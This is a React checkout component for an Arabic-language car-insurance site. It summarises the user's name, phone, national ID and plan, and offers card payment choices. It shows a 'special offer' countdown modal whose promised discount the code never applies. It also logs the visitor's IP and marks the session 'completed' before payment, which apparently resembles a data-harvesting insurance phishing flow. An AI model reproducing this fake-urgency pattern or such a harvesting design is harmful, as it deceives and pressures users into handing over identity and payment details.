import React, { useEffect, useRef, useState } from "react";
import { useLocation } from "wouter";
import InsuranceHeader from "@/components/InsuranceHeader";
import InsuranceStepper from "@/components/InsuranceStepper";
import LoadingOverlay from "@/components/LoadingOverlay";
import StepLoadingScreen from "@/components/StepLoadingScreen";
import { trpc } from "@/lib/trpc";
import { useVisitorSession } from "@/hooks/useVisitorSession";
import { useVisitorGuard } from "@/hooks/useVisitorGuard";

type PaymentMethod = "visa" | "mastercard" | "mada" | "";

const PAYMENT_OPTIONS: { method: PaymentMethod; title: string; sub: string; color: string; icon: string }[] = [
  { method: "visa", title: "Visa", sub: "فيزا", color: "from-blue-600 to-blue-700", icon: "VISA" },
  { method: "mastercard", title: "Mastercard", sub: "ماستركارد", color: "from-red-500 to-orange-500", icon: "MC" },
  { method: "mada", title: "Mada", sub: "مدى", color: "from-emerald-600 to-teal-600", icon: "mada" },
];

export default function Step5Summary() {
  const [, navigate] = useLocation();
  const { sessionId, visitorIp, saveData, getStoredData } = useVisitorSession();
  const guard = useVisitorGuard(visitorIp);
  const [payMethod, setPayMethod] = useState<PaymentMethod>("");
  const [payError, setPayError] = useState("");
  const [showModal, setShowModal] = useState(false);
  const [minutes, setMinutes] = useState(25);
  const [seconds, setSeconds] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const upsertMutation = trpc.insurance.upsert.useMutation();
  const stored = getStoredData();

  function startTimer() {
    if (timerRef.current) clearInterval(timerRef.current);
    let m = 25, s = 0;
    timerRef.current = setInterval(() => {
      if (s === 0) { if (m === 0) { clearInterval(timerRef.current!); return; } m--; s = 59; } else { s--; }
      setMinutes(m); setSeconds(s);
    }, 1000);
  }

  useEffect(() => () => { if (timerRef.current) clearInterval(timerRef.current); }, []);

  async function handleConfirm() {
    if (!payMethod) { setPayError("يرجى اختيار وسيلة الدفع"); return; }
    setPayError("");
    const cardTypeLabel = payMethod === "visa" ? "Visa" : payMethod === "mastercard" ? "Mastercard" : "Mada";
    saveData({ paymentMethod: cardTypeLabel });
    await upsertMutation.mutateAsync({ sessionId, visitorIp, paymentMethod: cardTypeLabel, status: "completed" });
    setShowModal(true);
    startTimer();
  }

  function handleContinue() {
    setShowModal(false);
    if (timerRef.current) clearInterval(timerRef.current);
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      navigate("/insurance/payment");
    }, 800);
  }

  const addons = (() => { try { return JSON.parse((stored.addons as string) ?? "[]"); } catch { return []; } })();
  const summaryItems = [
    { label: "نوع العرض", value: stored.offerType === "new" ? "تأمين جديد" : "نقل الملكية" },
    { label: "الاسم", value: stored.userName },
    { label: "رقم الهاتف", value: stored.phoneNumber },
    { label: "رقم الهوية", value: stored.idNumber },
    { label: "المركبة", value: stored.carMake },
    { label: "سنة الصنع", value: stored.carYear },
    { label: "المدينة", value: stored.city },
    { label: "شركة التأمين", value: stored.planCompany },
    { label: "الخطة", value: stored.planName },
    { label: "سعر الخطة", value: stored.planPrice ? `${stored.planPrice} ريال` : undefined },
  ].filter(i => i.value);

  return (
    <div className="min-h-screen bg-gray-50 flex justify-center">
      <div className="w-full max-w-[480px] bg-white min-h-screen flex flex-col">
        <InsuranceHeader />
        <InsuranceStepper currentStep={5} />
        <main className="flex-1 px-4 py-5">
          <h2 className="text-base font-bold mb-4 text-gray-800">الملخص والدفع</h2>

          {/* ملخص الطلب */}
          <div className="bg-white border border-gray-200 rounded-xl p-4 mb-4">
            <h3 className="font-bold text-sm text-gray-700 mb-3">ملخص طلب التأمين</h3>
            <ul className="space-y-2">
              {summaryItems.map(item => (
                <li key={item.label} className="flex justify-between text-sm">
                  <span className="text-gray-500">{item.label}</span>
                  <span className="font-semibold text-gray-800">{item.value as string}</span>
                </li>
              ))}
              {addons.map((a: any) => (
                <li key={a.name} className="flex justify-between text-sm">
                  <span className="text-gray-500">{a.name}</span>
                  <span className="font-semibold text-blue-600">+ {a.price} ريال</span>
                </li>
              ))}
            </ul>
            <div className="border-t border-gray-100 mt-3 pt-3 flex justify-between">
              <span className="font-bold text-gray-700">الإجمالي</span>
              <span className="font-bold text-blue-600 text-lg">{(stored.total as number ?? 0).toLocaleString("ar-SA")} ريال</span>
            </div>
            <p className="text-xs text-gray-400 mt-1">الإجمالي تقريبي وغير ملزم حتى إصدار عرض السعر النهائي.</p>
          </div>

          {/* خيارات الدفع */}
          <div className="bg-white border border-gray-200 rounded-xl p-4 mb-4">
            <h3 className="font-bold text-sm text-gray-700 mb-3">طريقة الدفع</h3>
            <div className="grid grid-cols-1 gap-2.5">
              {PAYMENT_OPTIONS.map(opt => (
                <div
                  key={opt.method}
                  onClick={() => { setPayMethod(opt.method); setPayError(""); }}
                  className={`flex items-center justify-between p-3.5 rounded-xl border-2 cursor-pointer transition-all duration-200 ${
                    payMethod === opt.method
                      ? "border-blue-500 bg-blue-50 shadow-sm"
                      : "border-gray-200 hover:border-gray-300 bg-white"
                  }`}
                >
                  <div className="flex items-center gap-3">
                    {/* أيقونة البطاقة */}
                    <div className={`w-12 h-8 rounded-md bg-gradient-to-r ${opt.color} flex items-center justify-center text-white text-[10px] font-bold tracking-wide shadow-sm`}>
                      {opt.icon === "MC" ? (
                        <div className="flex items-center">
                          <div className="w-3 h-3 rounded-full bg-red-400/80 mr-[-4px]" />
                          <div className="w-3 h-3 rounded-full bg-yellow-400/80" />
                        </div>
                      ) : (
                        <span className="text-[10px]">{opt.icon}</span>
                      )}
                    </div>
                    <div>
                      <div className="font-semibold text-sm text-gray-800">{opt.title}</div>
                      <div className="text-xs text-gray-500">{opt.sub}</div>
                    </div>
                  </div>
                  <input type="radio" readOnly checked={payMethod === opt.method} className="accent-blue-600 w-4 h-4" />
                </div>
              ))}
            </div>
            {payError && <p className="text-red-500 text-xs mt-2 font-medium">{payError}</p>}
          </div>

          {/* أزرار التنقل */}
          <div className="flex gap-3">
            <button type="button" onClick={() => navigate("/insurance/step4")} className="flex-1 py-3.5 border border-gray-300 text-gray-600 rounded-xl font-bold text-base hover:bg-gray-50 transition-all">السابق</button>
            <button type="button" onClick={handleConfirm} className="flex-1 py-3.5 bg-blue-600 text-white rounded-xl font-bold text-base hover:bg-blue-700 active:scale-[0.98] transition-all">تأكيد الدفع</button>
          </div>
        </main>

        {/* Modal العرض الخاص مع العداد التنازلي */}
        {showModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60">
            <div className="bg-white rounded-2xl p-6 mx-4 max-w-sm w-full text-center relative">
              <button onClick={() => setShowModal(false)} className="absolute top-3 left-3 text-gray-400 hover:text-gray-600 text-xl font-bold">×</button>
              <div className="text-4xl mb-3">🎉</div>
              <h3 className="font-bold text-lg text-gray-800 mb-2">عرض خاص!</h3>
              <p className="text-sm text-gray-600 mb-4">أكمل الدفع الآن واحصل على خصم إضافي</p>
              <div className="flex justify-center gap-4 mb-5">
                <div className="text-center">
                  <div className="text-3xl font-bold text-blue-600">{String(minutes).padStart(2, "0")}</div>
                  <div className="text-xs text-gray-500">دقائق</div>
                </div>
                <div className="text-3xl font-bold text-gray-400">:</div>
                <div className="text-center">
                  <div className="text-3xl font-bold text-blue-600">{String(seconds).padStart(2, "0")}</div>
                  <div className="text-xs text-gray-500">ثواني</div>
                </div>
              </div>
              <button onClick={handleContinue} className="w-full py-3 bg-blue-600 text-white rounded-xl font-bold hover:bg-blue-700 transition-all">متابعة</button>
            </div>
          </div>
        )}
        <LoadingOverlay show={guard.loading} text={guard.loadingText} subtext={guard.loadingSubtext} />
        <StepLoadingScreen show={isLoading} />
      </div>
    </div>
  );
}
